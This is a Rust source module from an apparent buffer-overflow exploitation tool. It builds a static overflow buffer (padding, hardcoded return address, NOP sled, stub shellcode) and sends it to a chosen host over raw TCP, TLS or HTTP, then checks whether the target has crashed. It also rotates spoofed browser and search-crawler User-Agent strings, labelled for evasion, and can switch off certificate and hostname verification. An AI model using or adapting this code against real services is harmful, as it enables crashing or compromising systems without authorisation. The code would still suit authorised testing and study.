//! Core buffer-overflow automation: packet assembly, the raw/HTTP
//! transport used to deliver packets to a target, and the single-shot
//! "static exploit injector" profile. The fuzzing sweep that drives
//! this module concurrently lives in `workers`; CLI plumbing lives in
//! `main`.

use clap::ValueEnum;
use native_tls::TlsConnector;
use std::io::Write;
use std::net::{SocketAddr, TcpStream};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use crate::liveness;

/// Wire-encapsulation strategy used when assembling a packet.
#[derive(ValueEnum, Clone, Copy, Debug, PartialEq)]
pub enum ProtocolMode {
    Raw,
    Http,
}

/// Returns a pseudo-random modern browser or client signature string
/// based on system clock cycle (used only for the HTTP mode header).
fn get_random_user_agent() -> &'static str {
    let user_agents = [
        // --- Windows Browsers ---
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Edge/122.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",

        // --- macOS / iOS Browsers ---
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",

        // --- Linux / Android Browsers ---
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",

        // --- Search Engine Crawlers (Common Evasion/Spoofing Targets) ---
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://google.com)",
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://bing.com)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp; http://yahoo.com)",
        "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://baidu.com)",
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com)",

        // --- API Clients & Dev Frameworks ---
        "PostmanRuntime/7.36.3",
        "curl/8.5.0",
        "Wget/1.21.4",
        "python-requests/2.31.0",
        "Go-http-client/1.1"
    ];

    // High-speed clock calculation to select an index entry dynamically without external dependencies
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_else(|_| Duration::new(0, 0))
        .subsec_nanos();

    let index = (nanos as usize) % user_agents.len();
    user_agents[index]
}

/// Wraps a raw payload buffer in the chosen wire format (raw bytes +
/// newline, or a minimal HTTP POST envelope).
pub fn assemble_packet(buffer: &[u8], mode: ProtocolMode, host: &str) -> Vec<u8> {
    let mut packet = Vec::new();
    match mode {
        ProtocolMode::Raw => {
            packet.extend_from_slice(buffer);
            packet.extend_from_slice(b"\n");
        }
        ProtocolMode::Http => {
            let dynamic_ua = get_random_user_agent();
            let http_header = format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 User-Agent: {}\r\n\
                 Content-Type: application/x-www-form-urlencoded\r\n\
                 Content-Length: {}\r\n\
                 Connection: close\r\n\r\n\
                 data=",
                host,
                dynamic_ua,
                buffer.len() + 5
            );
            packet.extend_from_slice(http_header.as_bytes());
            packet.extend_from_slice(buffer);
        }
    }
    packet
}

/// Opens a TCP connection (upgrading to TLS for port 443) and writes
/// `data` to it once.
pub fn connect_and_transmit(
    socket_addrs: &[SocketAddr],
    host: &str,
    port: u16,
    data: &[u8],
    allow_self_signed: bool,
) -> Result<(), Box<dyn std::error::Error>> {
    let target_addr = socket_addrs.first().ok_or("No valid IP addresses resolved.")?;
    let stream = TcpStream::connect_timeout(target_addr, Duration::from_secs(3))?;

    if port == 443 {
        let mut builder = TlsConnector::builder();
        if allow_self_signed {
            builder.danger_accept_invalid_certs(true);
            builder.danger_accept_invalid_hostnames(true);
        }
        let connector = builder.build()?;
        let mut tls_stream = connector.connect(host, stream)?;
        tls_stream.write_all(data)?;
        tls_stream.flush()?;
    } else {
        let mut raw_stream = stream;
        raw_stream.write_all(data)?;
        raw_stream.flush()?;
    }
    Ok(())
}

/// Splits a `host[:port]` / `http(s)://host[:port][/path]` string into
/// a bare host and resolved port, defaulting to 443 for https and 80
/// otherwise.
pub fn parse_target_and_port(input: &str) -> (String, u16) {
    let trimmed = input.trim();
    let default_port = if trimmed.starts_with("https://") { 443 } else { 80 };

    let mut sanitized = trimmed
        .trim_start_matches("https://")
        .trim_start_matches("http://")
        .to_string();

    if let Some(slash_idx) = sanitized.find('/') {
        sanitized.truncate(slash_idx);
    }

    if let Some(colon_idx) = sanitized.rfind(':') {
        let host = sanitized[..colon_idx].to_string();
        let port_str = &sanitized[colon_idx + 1..];

        if let Ok(custom_port) = port_str.parse::<u16>() {
            return (host, custom_port);
        }
    }

    (sanitized, default_port)
}

/// Builds the static offset + return-address + NOP-sled + shellcode
/// overflow buffer used by the non-fuzzing "static exploit injector"
/// profile.
fn build_static_overflow_buffer() -> Vec<u8> {
    let offset_length = 146;
    let nop_sled = vec![0x90; 16];
    let target_return_address = vec![0xAF, 0x12, 0x50, 0x62];
    let shellcode: Vec<u8> = vec![0x90, 0x90, 0xcc];

    let mut overflow_buffer = Vec::new();
    overflow_buffer.extend(vec![b'A'; offset_length]);
    overflow_buffer.extend(target_return_address);
    overflow_buffer.extend(nop_sled);
    overflow_buffer.extend(shellcode);
    overflow_buffer
}

/// Runs the single-shot static exploit injector profile: builds the
/// overflow buffer, wraps it per `mode`, and transmits it once.
pub fn run_static_injector(
    socket_addrs: &[SocketAddr],
    host: &str,
    port: u16,
    mode: ProtocolMode,
    allow_self_signed: bool,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("[*] Running standard static exploit injector profile...");

    let overflow_buffer = build_static_overflow_buffer();
    let final_packet = assemble_packet(&overflow_buffer, mode, host);

    connect_and_transmit(socket_addrs, host, port, &final_packet, allow_self_signed)?;
    println!("[+] Static instruction set sent successfully.");

    if liveness::is_alive(socket_addrs, Duration::from_secs(2)) {
        println!("[*] Post-send check: target is still responding.");
    } else {
        println!("[!] Post-send check: target is NOT responding (possible crash/down).");
    }

    Ok(())
}
